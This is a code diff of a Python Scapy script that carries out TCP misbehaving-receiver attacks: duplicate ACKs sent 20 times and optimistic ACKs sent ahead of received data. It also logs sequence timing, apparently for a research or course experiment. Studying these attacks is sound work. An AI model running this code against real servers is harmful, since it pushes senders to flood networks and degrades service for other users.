@@ -19,7 +19,6 @@ FileName = "npy/%s.npy" % sys.argv[1]
 MTU = 1472 # Default for TCP
 WAIT_TIME = 0.05
 currACKNo = 0
-startACKNo = 0
 MAX_SIZE = 200000
 
 ## Defined across all tranmission types.
@@ -39,8 +38,6 @@ initialSeq = syn_ack[TCP].seq
 getStr = 'GET / HTTP/1.1\r\n\r\n'
 request = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
                  seq=(syn_ack[TCP].ack), ack=(syn_ack[TCP].seq + 1), flags='FA') / getStr
-maxACK = (syn_ack[TCP].seq + 1)
-
 socket.send(Ether() / request)
 
 
@@ -48,7 +45,7 @@ socket.send(Ether() / request)
 ##########################################
 ### Function to send ACK used in opt.
 def send_ACK():
-  global currACKNo, socket2, startACKNo
+  global currACKNo, socket2
   while (currACKNo - initialSeq) < MAX_SIZE:
     currACKNo += MTU
     ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
@@ -85,16 +82,13 @@ def normal(pkt):
 ### Proper handling for packet with DUP attack.
 #########################################################
 def dup(pkt):
-  global DST_PORT, IP_DST, data, socket, maxACK
+  global DST_PORT, IP_DST, data, socket
   if (check_pkt(pkt)):
     return
   data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
-  nextACK_num = (pkt[TCP].seq + data_len(pkt))
-  if maxACK > nextACK_num:
-    return
-  maxACK = nextACK_num
+
   ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
-             seq=(pkt[TCP].ack), ack=nextACK_num, flags='A')
+             seq=(pkt[TCP].ack), ack=(pkt[TCP].seq + data_len(pkt)), flags='A')
   for i in xrange(20):
     socket.send(Ether() / ack_pkt)
 
@@ -128,7 +122,6 @@ def op(pkt):
   if (check_pkt(pkt)):
     return
   data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
-  #  TODO: Finish op.
 
 
 
@@ -136,13 +129,10 @@ def op(pkt):
 #################################################
 ## Special timing stuff for op attack.
 if sys.argv[1] == 'op':
-    t = threading.Timer(WAIT_TIME, send_ACK)
-
-    startACKNo = syn_ack[TCP].seq + 1
-    currACKNo = startACKNo
-    our_seq_no = syn_ack[TCP].ack + len(getStr) + 1
-
-    t.start()
+  currACKNo = syn_ack[TCP].seq + 1
+  our_seq_no = syn_ack[TCP].ack + len(getStr) + 1
+  t = threading.Timer(WAIT_TIME, send_ACK)
+  t.start()
 
 ### Choose proper ACK handling given attack type.
 #########################################################
